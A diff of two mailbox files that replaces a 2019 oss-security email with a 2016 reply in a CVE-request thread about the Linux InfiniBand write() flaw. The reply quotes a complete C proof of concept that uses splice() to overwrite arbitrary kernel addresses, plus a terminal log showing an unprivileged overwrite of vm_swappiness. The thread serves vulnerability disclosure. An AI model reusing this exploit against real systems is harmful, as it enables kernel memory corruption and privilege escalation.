@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1039" "Monday" "12" "August" "2019" "14:11:10" "+0200" "Solar Designer" "solar@openwall.com" "<20190812121109.GA22633@openwall.com>" "30" "Re: [oss-security] linux-distros membership application - Microsoft" nil nil nil "8" "2019081212:11:10" "[oss-security] linux-distros membership application - Microsoft" (number mark "U       solar@openwa Aug 12   30/1039  " thread-indent "\"Re: [oss-security] linux-distros membership application - Microsoft\"\n") "<20190812024751.GA17747@sasha-vm>" ("<20190626141358.GK7898@sasha-vm>" "<20190627140321.GA29338@openwall.com>" "<20190812024751.GA17747@sasha-vm>") nil nil nil nil nil nil nil "Re: [oss-security] linux-distros membership application - Microsoft" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5682" "Monday" "9" "May" "2016" "21:10:41" "+0200" "Yann Droneaud" "ydroneaud@opteya.com" "<1462821041.4268.43.camel@opteya.com>" "176" "Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'" "^Cc:" nil nil "5" "2016050919:10:41" "[oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'" (number mark "        ydroneaud@op May  9  176/5682  " thread-indent "\"Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'\"\n") "<20160509180208.GB6372@pc.thejh.net>" ("<20160507042232.GA5286@eldamar.local>" "<1462645186.4268.27.camel@opteya.com>" "<20160509180208.GB6372@pc.thejh.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 15808 invoked by uid 550); 12 Aug 2019 12:12:23 -0000
+Received: (qmail 24469 invoked by uid 550); 9 May 2016 19:11:16 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,47 +11,203 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 15367 invoked from network); 12 Aug 2019 12:11:17 -0000
-Date: Mon, 12 Aug 2019 14:11:10 +0200
-From: Solar Designer <solar@openwall.com>
-To: oss-security@lists.openwall.com
-Message-ID: <20190812121109.GA22633@openwall.com>
-References: <20190626141358.GK7898@sasha-vm> <20190627140321.GA29338@openwall.com> <20190812024751.GA17747@sasha-vm>
+Received: (qmail 24448 invoked from network); 9 May 2016 19:11:16 -0000
+Message-ID: <1462821041.4268.43.camel@opteya.com>
+In-Reply-To: <20160509180208.GB6372@pc.thejh.net>
+References: <20160507042232.GA5286@eldamar.local>
+	 <1462645186.4268.27.camel@opteya.com> <20160509180208.GB6372@pc.thejh.net>
+Organization: OPTEYA
+Content-Type: text/plain; charset="UTF-8"
+X-Mailer: Evolution 3.18.5.2 (3.18.5.2-1.fc23) 
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20190812024751.GA17747@sasha-vm>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] linux-distros membership application - Microsoft
+Content-Transfer-Encoding: 8bit
+X-SA-Exim-Connect-IP: 2a01:e35:2e9f:6ac0:ec14:7a2b:dba0:464c
+X-SA-Exim-Mail-From: ydroneaud@opteya.com
+X-SA-Exim-Version: 4.2.1 (built Mon, 26 Dec 2011 16:24:06 +0000)
+X-SA-Exim-Scanned: Yes (on ou.quest-ce.net)
+Cc: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>, Doug Ledford
+	 <dledford@redhat.com>, linux-rdma@vger.kernel.org, 
+	oss-security@lists.openwall.com
+Date: Mon, 09 May 2016 21:10:41 +0200
+From: Yann Droneaud <ydroneaud@opteya.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of
+ the write() interface'
+To: Jann Horn <jann@thejh.net>
+
+[Cc: oss-security@lists.openwall.com]
 
 Hi,
 
-I've just subscribed Sasha for Microsoft Linux Systems Group to
-linux-distros, and updated the wiki accordingly.
+Le lundi 09 mai 2016 à 20:02 +0200, Jann Horn a écrit :
+> On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
+> > Le samedi 07 mai 2016 à 06:22 +0200, Salvatore Bonaccorso a écrit :
+> > > 
+> > >  
+> > > Jann Horn reported an issue in the infiniband stack. It has been
+> > > fixed in v4.6-rc6 with commit
+> > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
+> > > 
+> > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
+> > > 
+> > > > 
+> > > > 
+> > > > IB/security: Restrict use of the write() interface
+> > > > The drivers/infiniband stack uses write() as a replacement for
+> > > > bi-directional ioctl().  This is not safe. There are ways to
+> > > > trigger write calls that result in the return structure that
+> > > > is normally written to user space being shunted off to user
+> > > > specified kernel memory instead.
+> > > > 
+> > That's an interesting issue.
+> > 
+> > I thought access_ok() done as part of copy_to_user() would protect
+> > from such unwelcomed behavior. But it's not if the kernel invoke
+> > write() handler outside of a user process.
+> > 
+> > Anyway, as I don't see yet how to reproduce the issue, is there a
+> > PoC available, I would be interested by a mean to trigger such
+> > write().
 
-On Sun, Aug 11, 2019 at 10:47:51PM -0400, Sasha Levin wrote:
-> Since Ubuntu took over quite a few tasks (thanks!), I can suggest the
-> following tasks for Microsoft:
+> Here is my writeup of the issue that I made quite a while ago - the
+> timeline is missing some of the more recent stuff, but meh.
 > 
-> As primary, administrative: "4. Evaluate relevance to other parties such
-> as the upstream, other affected distros (not present on the (sub-)list),
-> and other Open Source projects, ...".
+> ======================================================
 > 
-> As backup, administrative: "3. Evaluate if the issue (or one of the
-> issues) is effectively already public ...".
+> 
+> Here is a PoC that can be used to clobber data at arbitrary
+> writable kernel addresses if the rdma_ucm module is loaded (without
+> actually needing Infiniband hardware to be present):
+> 
+> =====
+> #define _GNU_SOURCE
+> #include 
+> #include 
+> #include 
+> #include 
+> #include 
+> #include 
+> 
+> #include 
+> #include 
+> #include 
+> #include 
+> #include 
+> 
+> #define RDMA_PS_TCP 0x0106
+> 
+> // This method forces the kernel to write arbitrary data to the
+> // target fd under set_fs(KERNEL_DS), bypassing address limit
+> // checks in anything that extracts pointers from written data.
+> int write_without_addr_limit(int fd, char *buf, size_t len) {
+>   int pipefds[2];
+>   if (pipe(pipefds))
+>     return -1;
+>   ssize_t len_ = write(pipefds[1], buf, len);
+>   if (len == -1)
+>     return -1;
+>   int res = splice(pipefds[0], NULL, fd, NULL, len_, 0);
+>   int errno_ = errno;
+>   close(pipefds[0]);
+>   close(pipefds[1]);
+>   errno = errno_;
+>   return res;
+> }
+> 
+> int clobber_kaddr(unsigned long kaddr) {
+>   // open infiniband fd
+>   int fd = open("/dev/infiniband/rdma_cm", O_RDWR);
+>   if (fd == -1)
+>     err(1, "unable to open /dev/infiniband/rdma_cm - maybe the RDMA kernel module isn't loaded?");
+> 
+>   // craft malicious write buffer
+>   // structure:
+>   //   struct rdma_ucm_cmd_hdr hdr
+>   //   struct rdma_ucm_create_id cmd
+>   char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_create_id)];
+>   struct rdma_ucm_cmd_hdr *hdr = (void*)buf;
+>   struct rdma_ucm_create_id *cmd = (void*)(buf + sizeof(struct rdma_ucm_cmd_hdr));
+>   hdr->cmd = RDMA_USER_CM_CMD_CREATE_ID;
+>   hdr->in = 0;
+>   hdr->out = sizeof(struct rdma_ucm_create_id_resp);
+>   cmd->ps = RDMA_PS_TCP;
+>   cmd->response = kaddr;
+> 
+>   int res = write_without_addr_limit(fd, buf, sizeof(buf));
+>   int errno_ = errno;
+>   close(fd);
+>   errno = errno_;
+>   return res;
+> }
+> 
+> int main(int argc, char **argv) {
+>   if (argc != 2)
+>     errx(1, "want one argument (kernel address to clobber)");
+>   char *endp;
+>   unsigned long kaddr = strtoul(argv[1], &endp, 0);
+>   if (kaddr == ULONG_MAX || *endp || endp == argv[1])
+>     errx(1, "bad input number");
+> 
+>   int r = clobber_kaddr(kaddr);
+>   if (r >= 0) {
+>     printf("that probably worked? clobber_kaddr(0x%lx)=%d\n", kaddr, r);
+>     return 0;
+>   } else {
+>     printf("failed: %m\n");
+>     return 1;
+>   }
+> }
 
-Great.  I've listed Microsoft Linux Systems Group for those two roles.
 
-> I can also offer to act as a liason between linux-distros and
-> security@k.o now,
+Is this only achievable through splice() ?
 
-Please do.  I assume this is part of what you'll be doing under "4.
-Evaluate relevance to other parties such as the upstream ...", so I
-didn't add a separate role for this.
 
-> and MSRC in the future.
+> =====
+> 
+> And here is an example that shows that this indeed works, tested
+> on a Debian distro kernel:
+> 
+> First, as root (warning: this will make the currently running system
+> exploitable):
+> root@debian:~# modprobe rdma_ucm
+> 
+> Now, as attacker:
+> user@debian:~$ cat /proc/sys/vm/swappiness
+> 60
+> user@debian:~$ ls -l /dev/infiniband/rdma_cm
+> crw-rw-rw- 1 root root 10, 59 Jan  9 23:07 /dev/infiniband/rdma_cm
+> user@debian:~$ gdb -q -ex 'print &vm_swappiness' -ex quit
+> /usr/lib/debug/boot/vmlinux-$(uname -r)
+> Reading symbols from /usr/lib/debug/boot/vmlinux-3.16.0-4-
+> amd64...done.
+> $1 = (int *) 0xffffffff81861760 <vm_swappiness>
+> user@debian:~$ gcc -Wall -std=gnu99 -o infiniwrite infiniwrite.c
+> user@debian:~$ ./infiniwrite 0xffffffff81861760
+> that probably worked? clobber_kaddr(0xffffffff81861760)=32
+> user@debian:~$ cat /proc/sys/vm/swappiness
+> 0
+> 
+> As you can see, the vm_swappiness variable in kernelspace was
+> overwritten by an unprivileged userspace process.
+> 
+> Timeline:
+> 2015-09-11 initial report to security@kernel.org and infiniband maintainers;
+>         exploitability isn't entirely clear to me yet
+> 2015-09-11 infiniband maintainer responds, but apparently doesn't see an issue
+> 2015-12-26 I figure out the splice trick and ask the infiniband maintainers to
+>         fix the issue
+> 2015-12-26 Andy Lutomirski asks the infiniband maintainers to fix the issue and
+>         break the ABI if necessary
+> 2016-01-25 I send the PoC contained in this message to security@kernel.org and
+>         the infiniband maintainers and ask them again to fix the issue.
+> 
 
-As the full description of task 4 says, "with the reporter's approval".
+Thanks a lot !
 
-Alexander
+Regards.
+
+-- 
+Yann Droneaud
+OPTEYA
+
+
